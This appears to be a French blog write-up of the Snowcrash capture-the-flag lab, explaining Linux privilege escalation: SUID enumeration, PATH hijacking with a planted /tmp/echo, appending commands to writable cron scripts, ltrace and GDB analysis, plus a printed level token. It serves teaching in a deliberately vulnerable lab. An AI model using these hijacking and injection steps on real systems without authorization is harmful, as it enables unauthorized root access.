---
title: "Snowcrash - Introduction à la cybersécurité et à l'élévation des privilèges"
date: 2026-01-27 10:00:00 +0100
categories: [Cybersecurity, System Administration, Reverse Engineering]
tags: [CTF, Privilege Escalation, Linux, SUID, Reverse Engineering, Cron, Bash, Binary Exploitation]
render_with_liquid: false
---

# Introduction :

Dans les modèles de sécurité Linux, l'élévation de privilèges se produit lorsqu'un attaquant exploite un bogue, un défaut de conception ou une erreur de configuration dans un système d'exploitation ou une application logicielle pour obtenir un accès élevé à des ressources normalement protégées. Snowcrash est le point d'entrée dans le domaine de la sécurité du système : il vous apprend à penser comme un attaquant : examinez chaque autorisation de fichier, chaque processus en cours d'exécution et chaque script comme une surface d'attaque potentielle.

# Objectifs du projet :

Snowcrash est un projet 1337 basé sur un format Capture The Flag (CTF). L'objectif est de naviguer dans une image ISO intentionnellement vulnérable, de découvrir des jetons pour progresser à travers 15 niveaux, pour finalement élever les privilèges jusqu'au niveau root. Chaque niveau présente une classe de vulnérabilité unique – depuis les autorisations de fichiers faibles et le détournement de `$PATH` jusqu'à l'ingénierie inverse des fichiers binaires compilés, l'injection de scripts et les secrets codés en dur.

# Introduction aux autorisations Linux :

Comprendre les autorisations de fichiers Linux est fondamental à tous les niveaux. Chaque fichier dispose de trois ensembles d'autorisations : **propriétaire**, **groupe** et **autres** - chacun avec trois bits : **lecture (r/4)**, **écriture (w/2)** et **exécution (x/1)**.

$ ls -la /usr/local/bin/level01 -rwsr-x--- 1 flag01 niveau01 7,2K 28 janvier 2026 niveau01

Le `s` en position d'exécution du propriétaire signifie que le bit **SUID** est défini.

| Special bit | Octal | Effect on executable |
|---|---|---|
| SUID (4xxx) | 4000 | Executes as the file's **owner** |
| SGID (2xxx) | 2000 | Executes as the file's **group** |
| Sticky (1xxx) | 1000 | Only owner can delete files in dir |

# Procédure pas à pas :

:one : Configuration de l'environnement et reconnaissance :

Montez l'ISO fourni dans VirtualBox. Connectez-vous via SSH en utilisant les informations d'identification du niveau. La reconnaissance initiale est la même à tous les niveaux :

$ ssh niveau00@192.168.56.101 -p 4242

$ id && ls -la $ find / -user flagXX 2>/dev/null # fichiers appartenant à l'utilisateur cible $ find / -perm -4000 2>/dev/null # tous les binaires SUID sur le système $ ps aux # processus en cours d'exécution $ crontab -l; cat /etc/cron*/* 2>/dev/null # tâches planifiées $ env # variables d'environnement

:deux : Analyse des binaires SUID :

Lorsqu'un binaire appartenant à `flagXX` possède le bit SUID, son exploitation exécute le code sous la forme `flagXX`. Tout d’abord, rassemblez des informations statiques :

$ file /usr/local/bin/levelXX $ strings /usr/local/bin/levelXX # chaînes, chemins, mots de passe codés en dur $ ltrace /usr/local/bin/levelXX # intercepter les appels de bibliothèque (fuites strcmp) $ strace /usr/local/bin/levelXX # intercepter les appels système (ouvert/lecture/écriture)

`ltrace` est la première étape la plus puissante : si le binaire appelle `strcmp(user_input, "real_pass")`, le mot de passe est immédiatement visible dans la sortie de trace.

:trois : Détournement de PATH :

Si un binaire SUID appelle une commande en utilisant un **chemin relatif** (par exemple, `echo`) au lieu d'un chemin absolu (`/bin/echo`), le shell recherche `$PATH` pour le localiser. Ajoutez un répertoire que vous contrôlez :

# Confirmer l'utilisation relative des commandes $ strings /usr/local/bin/levelXX | grep -v "^/"

# Créez un remplacement malveillant dans /tmp $ echo "/bin/getflag" > /tmp/echo $ chmod +x /tmp/echo

# Détourner PATH et déclencher l'export binaire $ PATH=/tmp:$PATH $ /usr/local/bin/levelXX Check flag.Voici votre token : <TOKEN>

:quatre : Injection de tâches Cron :

Les tâches Cron exécutent périodiquement des scripts en tant qu'utilisateur spécifique. Si une tâche cron appartenant à `flagXX` exécute un script **inscriptible**, injectez une charge utile :

# Énumérer les définitions cron $ ls -la /etc/cron.d/ /etc/cron.hourly/ /var/spool/cron/

# Si un script cron est accessible en écriture : $ echo "/bin/getflag > /tmp/token" >> /path/to/writable_script.sh

# Attendre l'exécution $ watch -n 1 cat /tmp/token

:cinq : Ingénierie inverse avec GDB et objdump :

Pour les binaires compilés, désassemblez statiquement et déboguez dynamiquement :

# Désassemblage statique $ objdump -d -M intel /usr/local/bin/levelXX | grep -A 20 "<main>"

# Débogage dynamique $ gdb -q /usr/local/bin/levelXX (gdb) set disassembly-flavor intel (gdb) break main (gdb) run (gdb) disassemble (gdb) info registers (gdb) x/s $eax # examiner la mémoire sous forme de chaîne

Modèle courant : une instruction `cmp` comparant une valeur calculée à une constante codée en dur. Notez la constante, convertissez-la en hexadécimal et fournissez-la en entrée.

:six : Analyse du script et du langage interprété :

Certains niveaux utilisent des scripts Lua, PHP, Python ou Bash exécutés sous un wrapper privilégié :

# Lisez le script pour trouver ce qu'il exécute ou ses sources $ cat /usr/local/bin/levelXX.py

# S'il lit ou exécute un fichier dans lequel vous pouvez écrire : # Injectez un appel à getflag dans le fichier inscriptible

# Si un script Perl/PHP a un binaire wrapper SUID : $ ls -la /usr/local/bin/levelXX -rwsr-x--- 1 flagXX levelXX ... levelXX # wrapper $ cat /usr/local/bin/levelXX.pl # inspecte le script qu'il lance

:seven : Récupération et utilisation des jetons :

Le but de chaque exploit est d'exécuter `getflag` dans le contexte de `flagXX`. Le jeton imprimé est le mot de passe SSH pour le niveau suivant.

# Après avoir obtenu un shell en tant que flagXX (par exemple via su ou un shell généré à partir d'un exploit) : $ getflag Vérifiez le drapeau. Voici votre jeton : Nf3OBZ0gxqVfLRQSMHv8gLwHo

# Utilisez-le pour vous connecter au niveau suivant : $ ssh flag01@192.168.56.101 -p 4242 Mot de passe : Nf3OBZ0gxqVfLRQSMHv8gLwHo $ getflag

# Questions et réponses

:question : Qu'est-ce qu'un bit Set-User-ID (SUID) et comment le noyau le gère-t-il ?

> Lorsque `execve()` charge un exécutable SUID, le noyau définit l'**ID utilisateur effectif (EUID)** du processus sur l'UID du propriétaire du fichier, tandis que le **ID utilisateur réel (RUID)** reste l'UID de l'appelant. Toutes les vérifications d'autorisation (lecture de fichiers, exécution de `getflag`) sont contrôlées par l'EUID. Le processus fonctionne donc avec les privilèges du propriétaire du fichier, quel que soit celui qui l'a lancé.

:question : Pourquoi l'utilisation de chemins relatifs dans les binaires SUID est-elle dangereuse ?

> Les noms de commandes relatifs (par exemple, `echo`) sont résolus en recherchant `$PATH`. Étant donné que `$PATH` est une variable d'environnement contrôlée par l'utilisateur, un attaquant peut ajouter un répertoire qu'il possède, y placer un script malveillant portant le même nom et amener le processus SUID à exécuter son script avec des privilèges élevés.

:question : Que fait `2>/dev/null` dans les commandes bash ?

> Le descripteur de fichier `2` est une erreur standard (`stderr`). Le rediriger vers `/dev/null` fait taire tous les messages d'erreur. Lors de la reconnaissance avec `find / -perm -4000`, le système génère des milliers d'erreurs « Autorisation refusée » pour les répertoires inaccessibles. Les supprimer rend les résultats réels lisibles.

:question : Quelle est la différence entre `ltrace` et `strace` ?

> `strace` intercepte les **appels système du noyau** (par exemple, `open()`, `read()`, `execve()`) à la limite espace utilisateur/noyau. `ltrace` intercepte les appels aux **fonctions de bibliothèque partagée** (par exemple, `strcmp()`, `malloc()` depuis la libc). Pour Snowcrash, `ltrace` est généralement plus utile car il révèle des arguments de fonction de haut niveau, y compris les mots de passe codés en dur transmis à `strcmp`.

:question : Quelle est la différence entre RUID, EUID et Saved SUID ?

> Les processus Linux conservent trois UID. Le **Real UID (RUID)** identifie qui a lancé le processus. Le **UID effectif (EUID)** est utilisé pour toutes les vérifications d'autorisation ; pour les binaires SUID, il est défini sur l'UID du propriétaire du fichier. Le **Saved Set-UID (SSUID)** est une copie de l'EUID enregistrée au moment de l'exécution, permettant à un processus d'abandonner temporairement et de retrouver des privilèges élevés via `seteuid()`.

:question : Comment identifiez-vous un script cron inscriptible ?

> Examinez `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.hourly/` et les crontabs utilisateur avec `crontab -l`. Pour chaque script exécuté par une tâche cron privilégiée, vérifiez les autorisations des fichiers avec `ls -la`. Un script accessible en écriture par votre utilisateur actuel - ou stocké dans un répertoire dans lequel vous pouvez écrire - peut être modifié pour injecter des commandes arbitraires qui s'exécutent en tant qu'utilisateur de la tâche cron au prochain intervalle planifié.

# Ressources :

* Autorisations et attributs de fichiers Linux : https://wiki.archlinux.org/title/File_permissions_and_attributes
* Techniques d'élévation des privilèges Linux : https://payatu.com/blog/linux-privilege-escalation/
* Documentation GDB : https://sourceware.org/gdb/documentation/
* GTFOBins (référence sur les abus binaires SUID) : https://gtfobins.github.io/
* Escalade des privilèges Linux — HackTricks : https://book.hacktricks.xyz/linux-hardening/privilege-escalation
* Risques de sécurité des tâches Cron : https://www.cyberciti.biz/faq/linux-security-cron-jobs/
